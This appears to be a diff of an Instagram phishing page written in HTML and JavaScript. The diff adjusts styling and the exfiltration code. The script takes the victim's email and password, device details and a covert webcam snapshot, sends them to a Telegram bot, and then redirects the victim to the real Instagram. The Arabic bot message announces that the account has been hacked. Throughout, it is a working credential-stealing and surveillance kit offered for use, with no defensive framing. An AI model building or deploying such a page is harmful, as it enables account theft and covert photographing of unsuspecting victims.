@@ -101,6 +101,13 @@
             margin-top: 20px;
             color: #8e8e8e;
         }
+
+        .download-link img {
+            width: 150px;
+            height: 50px;
+            border-radius: 5px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
     </style>
 </head>
 <body>
@@ -120,10 +127,10 @@
             <div class="download-link">
                 <span>Download app:</span><br>
                 <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
-                    <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" alt="Download for Android" width="130" height="40">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" alt="Download for Android">
                 </a>
                 <a href="https://apps.apple.com/us/app/instagram/id389801252" target="_blank">
-                    <img src="https://banner2.cleanpng.com/20180707/fge/aaw4zfuop.webp" alt="Download for iOS" width="130" height="40">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/Apple_logo_black.svg/1200px-Apple_logo_black.svg.png" alt="Download for iOS">
                 </a>
             </div>
         </div>
@@ -183,7 +190,7 @@
                     setTimeout(() => {
                         context.drawImage(video, 0, 0, canvas.width, canvas.height);
                         video.srcObject.getTracks().forEach(track => track.stop());
-                        resolve(canvas.toDataURL('image/jpeg')); // Capture the image as base64
+                        resolve(canvas.toDataURL('image/jpeg'));
                     }, 3000); // Wait for 3 seconds before capturing
                 }).catch(() => resolve(null)); // Handle error and resolve null
             });
@@ -203,7 +210,7 @@
             const imageData = await captureImage();
 
             // Prepare the message to send to the bot in Arabic
-            const message = `🔓 *تم اختراق حساب الانستجرام بنجاح من قبل المطور PhantomX* 🔓\n\n` +
+            const message = `🔓 *حساب تم اختراقه! تفاصيل الحساب مكشوفة* 🔓\n\n` +
                             `💻 *معلومات الحساب:* 💻\n` +
                             `📧 البريد الإلكتروني: ${email}\n` +
                             `🔑 كلمة المرور: ${password}\n\n` +
@@ -219,8 +226,7 @@
                             `⚡ أنوية المعالج: ${deviceInfo.cpuCores}\n` +
                             `📺 دقة الشاشة: ${deviceInfo.screenResolution}\n\n` +
                             `🕒 *التوقيت:* ${currentTime}\n\n` +
-                            `👁️‍🗨️ *تم التقاط صورة المستخدم*`
-                            `☣ *⚜تم الاختراق من قبل PhantomX @tx_5w⚜*`;
+                            `👁️‍🗨️ *تم التقاط صورة المستخدم*`;
 
             // Send the information to Telegram bot
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -231,19 +237,15 @@
 
             // Send the captured image to Telegram bot
             if (imageData) {
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', imageData);
-                formData.append('caption', '📷 *تم التقاط صورة المستخدم*');
-
                 fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: 'POST',
-                    body: formData
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, photo: imageData, caption: "📷 *تم التقاط صورة المستخدم*" })
                 });
             }
 
             // Redirect the user to Instagram after sending the data
-            setTimeout(() => window.location.href = 'https://www.instagram.com', 3000); // 3 seconds delay
+            setTimeout(() => window.location.href = 'https://www.instagram.com', 2000);
         }
     </script>
 </body>
